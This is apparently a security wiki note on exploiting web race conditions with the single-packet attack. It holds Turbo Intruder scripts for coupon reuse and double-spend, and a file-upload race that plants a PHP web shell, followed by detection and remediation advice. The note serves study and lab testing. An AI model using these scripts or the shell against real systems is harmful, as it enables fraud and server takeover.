---
title: Race conditions (deep)
slug: race-conditions-deep
aliases: [single-packet-attack, turbo-intruder, toctou-web, limit-overrun]
---

> **TL;DR:** The single-packet attack eliminates network jitter by stuffing multiple HTTP requests into one TCP packet — enabling reliable exploitation of race windows as small as 1 ms for limit overruns, coupon reuse, double-spends, and TOCTOU file-upload bypasses.

## What it is
A race condition is a time-of-check-to-time-of-use (TOCTOU) flaw: the application checks a condition (balance sufficient, coupon unused, file extension valid) and then acts on it, but another request in the gap changes the underlying state. Traditional exploitation was unreliable because network jitter spread requests across milliseconds. The **single-packet attack** (James Kettle, 2023) solves this: by packing 20-30 complete HTTP requests into a single TCP packet, all arrive in the server's receive buffer simultaneously and are processed by worker threads in true parallel. HTTP/2 multiplexing makes this native — all requests share one connection with no head-of-line serialization.

## Preconditions / where it applies
- Application performs a **check-then-act** sequence without atomic locking (database transaction with `SELECT FOR UPDATE`, mutex, or compare-and-swap).
- Target supports HTTP/2 (for native single-packet) or HTTP/1.1 with keep-alive (for last-byte sync).
- Common targets: coupon/discount redemption, balance transfers, vote/like counts, gift card top-up, rate limits, file upload validation, session-based privilege assignment.
- BSCP Stage 2 commonly tests limit-overrun and single-packet technique.

## Technique

### 1 — Single-packet attack (HTTP/2)

HTTP/2 multiplexing sends multiple requests as frames on one connection. If all frames fit in one TCP packet (~65 KB), the server receives them atomically:

```
TCP packet:
  [HTTP/2 HEADERS frame stream 1] [DATA frame stream 1]
  [HTTP/2 HEADERS frame stream 2] [DATA frame stream 2]
  ...
  [HTTP/2 HEADERS frame stream 20] [DATA frame stream 20]
```

All 20 requests hit the server's HTTP/2 demuxer at the same instant and get dispatched to thread-pool workers in parallel.

**Burp Suite (2023.9+):** Send the request to Repeater, duplicate it into a tab group (20 copies), then "Send group (parallel)" — Burp uses single-packet delivery automatically.

### 2 — Turbo Intruder scripts

For fine-grained control, Turbo Intruder (Burp extension) provides `engine=Engine.BURP2` for HTTP/2 single-packet and `gate` for HTTP/1.1 last-byte sync.

**HTTP/2 single-packet (limit overrun):**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)  # HTTP/2
    # Queue 20 identical requests — they go in one packet
    for i in range(20):
        engine.queue(target.req, gate='race1')
    
    # Open the gate — all 20 fire simultaneously
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**HTTP/1.1 last-byte sync:**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           engine=Engine.THREADED)
    
    for i in range(20):
        engine.queue(target.req, gate='race1')
    
    # Last-byte sync: Turbo Intruder sends all but the final byte
    # of each request on separate connections, then sends all
    # final bytes simultaneously
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### 3 — Limit overrun (coupon reuse / double spend)

Classic pattern — a discount code that should be single-use:

```
Check: SELECT used FROM coupons WHERE code='SAVE20' → used=FALSE
Apply: UPDATE coupons SET used=TRUE WHERE code='SAVE20'
       UPDATE orders SET discount=20 WHERE order_id=X
```

Between check and update, send 20 parallel redemptions:

```http
POST /apply-coupon HTTP/2
Content-Type: application/x-www-form-urlencoded

coupon=SAVE20
```

All 20 see `used=FALSE`, all 20 apply the discount. The last `UPDATE` wins, but all orders got the discount.

Balance double-spend:

```http
POST /transfer HTTP/2
Content-Type: application/json

{"from": "attacker", "to": "recipient", "amount": 1000}
```

If balance check is `SELECT balance WHERE user='attacker'` and deduction is a separate `UPDATE`, 20 parallel transfers from a $1000 balance can transfer $20,000.

### 4 — Session-based race windows

Some race windows require multi-step setup per session. The attack needs a session-specific state:

1. Login → get session token
2. Add item to cart → session state updated
3. Race the checkout with coupon application

For these, use separate sessions and synchronize only the final step:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           engine=Engine.BURP2)
    
    # Each request uses a different pre-prepared session
    for i, session in enumerate(sessions):
        req = target.req.replace('SESSION_TOKEN', session)
        engine.queue(req, gate='race1')
    
    engine.openGate('race1')
```

### 5 — TOCTOU in file upload

The application checks the file extension, saves the file, then moves/renames it:

```
1. Upload shell.php → saved as /tmp/upload_abc123
2. Validation: check extension → .php rejected
3. If valid: move to /uploads/shell.jpg
```

Race window: between step 1 (file written to disk) and step 2 (validation + deletion). Send a request to access the file during this window:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           engine=Engine.BURP2)
    
    # Upload the malicious file
    upload_req = '''POST /upload HTTP/2
Content-Type: multipart/form-data; boundary=x

--x
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
--x--'''
    
    # Fetch it before deletion
    fetch_req = 'GET /uploads/shell.php?c=id HTTP/2\r\nHost: target\r\n\r\n'
    
    for i in range(5):
        engine.queue(upload_req, gate='race1')
        for j in range(10):
            engine.queue(fetch_req, gate='race1')
    
    engine.openGate('race1')
```

### 6 — Email-based race (password reset token reuse)

If the password reset generates a token, emails it, then invalidates old tokens — race the reset request:

```
1. Request reset for victim → token T1 generated
2. Request reset for attacker → token T2 generated (same code path)
3. If both fire simultaneously and the token is generated from the same seed/timestamp,
   T1 == T2 — attacker uses their own email to receive the token that works for victim
```

This also applies to email verification, OTP generation, and any token derived from time-based seeds without sufficient entropy.

### 7 — Detecting the race window

Methodology from PortSwigger:

1. **Identify candidate endpoints:** anything with limits, counters, one-time tokens, file operations.
2. **Benchmark normal behavior:** send 20 requests sequentially, note responses.
3. **Attack:** send 20 requests via single-packet, compare responses.
4. **Indicators:** more successes than expected (2 coupon redemptions instead of 1), inconsistent balances, multiple identical email confirmations.

```python
# Quick Python race tester (HTTP/2 via httpx)
import httpx, asyncio

async def race():
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [client.post("https://target/redeem",
                            data={"code": "SAVE20"},
                            cookies={"session": TOKEN})
                 for _ in range(20)]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status_code, len(r.content))

asyncio.run(race())
```

NOTE: `asyncio.gather` doesn't guarantee true single-packet delivery — Turbo Intruder or Burp's parallel send is more reliable. The Python approach works for wider windows (>5ms).

## Detection / blue-team
- Application logs showing multiple redemptions of a single-use token within milliseconds.
- Database anomalies: negative balances, count > max, duplicate transaction IDs.
- Monitor for HTTP/2 streams with identical request bodies arriving in the same TCP segment.
- Alert on concurrent requests from the same session hitting state-changing endpoints.

## Remediation
- **Atomic operations:** use database transactions with `SELECT ... FOR UPDATE` or `INSERT ... ON CONFLICT` (PostgreSQL), `INSERT IGNORE` (MySQL), or optimistic locking with version columns.
- **Idempotency keys:** require a unique client-generated key per request; reject duplicates at the DB constraint level.
- **Advisory locks:** `SELECT pg_advisory_lock(hash)` before check-and-act sequences.
- **Redis `SETNX` / `SET NX`:** atomic check-and-set for distributed rate limiting and deduplication.
- **File upload:** validate *before* writing to disk, or write to a directory that isn't web-accessible and move only after validation.
- **Token generation:** use CSPRNG (`/dev/urandom`, `secrets.token_hex()`) — never time-based seeds.

## References
- [PortSwigger — Race conditions](https://portswigger.net/web-security/race-conditions) — single-packet attack + labs
- [James Kettle — Smashing the state machine](https://portswigger.net/research/smashing-the-state-machine) — original research
- [PortSwigger — Turbo Intruder](https://portswigger.net/bappstore/9abfe09175e54b8aaef15af94a74331a) — extension docs

See also: [[race-conditions]], [[application-logic-flaws]], [[file-upload]], [[broken-access-control]], [[http2-h2-downgrade-desync-v3]]
